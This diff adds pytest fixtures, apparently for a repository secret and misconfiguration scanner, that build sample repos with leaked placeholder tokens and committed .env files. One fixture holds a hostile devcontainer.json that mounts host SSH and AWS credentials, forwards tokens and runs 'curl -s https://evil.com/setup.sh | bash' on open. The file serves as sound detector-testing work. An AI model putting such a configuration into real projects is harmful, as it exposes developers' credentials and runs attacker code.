@@ -316,6 +316,77 @@ def repo_with_rug_pull(tmp_path):
 
 
 @pytest.fixture
+def repo_with_framework_env_leak(tmp_path):
+    """Repo with framework env prefix secrets exposed to browser bundles."""
+    env_file = tmp_path / ".env.local"
+    env_file.write_text(
+        "NEXT_PUBLIC_SECRET_KEY='sk-live-abc123def456ghi789jkl012'\n"
+        "REACT_APP_API_SECRET='supersecretapikey12345678'\n"
+        "VITE_AUTH_TOKEN='vt_live_abcdefghijklmnop'\n"
+        "EXPO_PUBLIC_PRIVATE_KEY='expo_pk_1234567890abcdef'\n"
+        "GATSBY_SECRET_KEY='gatsby_sk_abcdefghijklmno'\n"
+        "NX_PUBLIC_API_KEY='nx_key_1234567890abcdef'\n"
+        "NEXT_PUBLIC_ANALYTICS_ID='UA-12345'\n"  # safe: not a secret keyword
+    )
+    return tmp_path
+
+
+@pytest.fixture
+def repo_with_1password_token(tmp_path):
+    """Repo with 1Password Connect tokens."""
+    config = tmp_path / "config.sh"
+    config.write_text(
+        "export OP_CONNECT_TOKEN=eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCJ9abcdefghij\n"
+        "export OP_CONNECT_HOST=https://connect.1password.internal\n"
+    )
+    docker_compose = tmp_path / "docker-compose.yml"
+    docker_compose.write_text(
+        "services:\n"
+        "  app:\n"
+        "    environment:\n"
+        "      - OP_CONNECT_TOKEN=ops_eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCJ9abcdefghijklmnopqrstuvwxyz0123456789\n"
+    )
+    return tmp_path
+
+
+@pytest.fixture
+def repo_with_env_files(tmp_path):
+    """Repo with committed .env variant files."""
+    (tmp_path / ".env").write_text("DB_HOST=localhost\n")
+    (tmp_path / ".env.production").write_text("DB_PASSWORD=prod_secret_123\n")
+    (tmp_path / ".env.local").write_text("API_KEY=local_dev_key_abc\n")
+    (tmp_path / ".env.example").write_text("DB_HOST=\nAPI_KEY=\n")  # safe
+    return tmp_path
+
+
+@pytest.fixture
+def repo_with_devcontainer_mounts(tmp_path):
+    """Repo with devcontainer.json mounting host secrets."""
+    dc_dir = tmp_path / ".devcontainer"
+    dc_dir.mkdir()
+    dc = dc_dir / "devcontainer.json"
+    dc.write_text(json.dumps({
+        "name": "Evil Dev Container",
+        "image": "mcr.microsoft.com/devcontainers/base:ubuntu",
+        "mounts": [
+            "source=${localEnv:HOME}/.ssh,target=/home/vscode/.ssh,type=bind",
+            "source=${localEnv:HOME}/.aws,target=/home/vscode/.aws,type=bind"
+        ],
+        "runArgs": ["--privileged"],
+        "initializeCommand": "curl -s https://evil.com/setup.sh | bash",
+        "postCreateCommand": "cp ~/.npmrc /workspace/.npmrc",
+        "remoteEnv": {
+            "GITHUB_TOKEN": "${localEnv:GITHUB_TOKEN}",
+            "AWS_ACCESS_KEY_ID": "${localEnv:AWS_ACCESS_KEY_ID}"
+        },
+        "features": {
+            "ghcr.io/evil-user/evil-feature:latest": {}
+        }
+    }, indent=2))
+    return tmp_path
+
+
+@pytest.fixture
 def clean_repo(tmp_path):
     """A clean repo with no security issues."""
     readme = tmp_path / "README.md"
